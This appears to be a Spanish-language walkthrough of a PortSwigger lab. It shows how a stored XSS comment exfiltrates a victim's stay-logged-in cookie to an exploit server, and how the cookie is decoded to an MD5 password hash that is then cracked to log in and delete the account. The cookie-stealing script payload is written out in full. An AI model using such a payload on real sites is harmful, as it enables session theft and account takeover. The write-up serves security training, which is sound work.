---
title: Offline password cracking
description: Laboratorio de Portswigger sobre Authentication Vulnerabilities
date: 2025-01-29 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Authentication Vulnerabilities
tags:
  - Portswigger Labs
  - Authentication Vulnerabilities
  - Offline password cracking
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP

## Descripción

Este `laboratorio` almacena el `hash de la contraseña` del usuario en una `cookie`. Además, contiene una `vulnerabilidad de XSS` en la `funcionalidad de comentarios`. Para `resolver` el `laboratorio`, debemos `obtener la cookie stay-logged-in` de `Carlos` mediante `XSS`, `crackear su hash de contraseña` y luego `iniciar sesión` como `carlos`. Finalmente, debemos `eliminar su cuenta` desde la página `Mi cuenta`. Podemos usar nuestras credenciales `wiener:peter` para iniciar sesión, el `nombre de usuario` de la `víctima` es `carlos` y podemos usar el diccionario `Candidate passwords` [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) para `crackear` la `contraseña`

---

## Guía de authentication vulnerabilities

`Antes `de `completar` este `laboratorio` es recomendable `leerse` esta `guía de authentication vulnerabilities` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Guide/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Guide/)

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_1.png)

Pulsamos sobre `My account`, nos `logueamos` usando las credenciales `wiener:peter` y marcamos la casilla de `Stay logged in`

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_2.png)

Pulsamos en `View post` y vemos que hay una `sección` de `comentarios`

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_3.png)

Vemos que hemos podido `inyectar código HTML`

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_4.png)

Si vemos el `código fuente` nos damos cuenta que el código insertado en la `sección` de `comentarios` no se está `HTML encodeando` 

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_5.png)

Nos dirigimos al `Exploit server` y copiamos la url `https://exploit-0a6800e703d4999e8022985501aa002c.exploit-server.net/exploit`, posteriormente vamos a publicar un comentario para `explotar` un `stored XSS` y así `obtener` la `cookie` del `usuario víctima`

```
<script>document.location='https://exploit-0a6800e703d4999e8022985501aa002c.exploit-server.net/exploit/'+document.cookie</script>
```

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_6.png)

Una vez publicado nos dirigimos al `Exploit server` y abrimos el apartado de `logs` y vemos este `log`

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_7.png)

Si `decodeamos` este `parámetro` de la cookie `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` obtener el `nombre` de `usuario` y la `contraseña` del usuario `hasheada`

```
# echo 'Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz' | base64 -d  
carlos:26323c16d5f4dabff3bb136f2460a943 
```

Además de `crackear` la `contraseña` con `john` o `hashcat` podemos usar `rainbow tables` para `obtener` la `contraseña`, existen varias web que podemos usar como [https://crackstation.net/](https://crackstation.net/)

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_8.png)

También podríamos `pegar` el `hash` en el `navegador` y `obtener` el `contenido` del `hash` de esta forma

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_9.png)

Una vez tenemos el `usuario` y la `contraseña` ya podemos acceder `iniciar sesión` con las credenciales `carlos:onceuponatime` y `borrar` al `usuario carlos`

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_10.png)

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_11.png)

![](/assets/img/Authentication-Vulnerabilities-Lab-10/image_12.png)
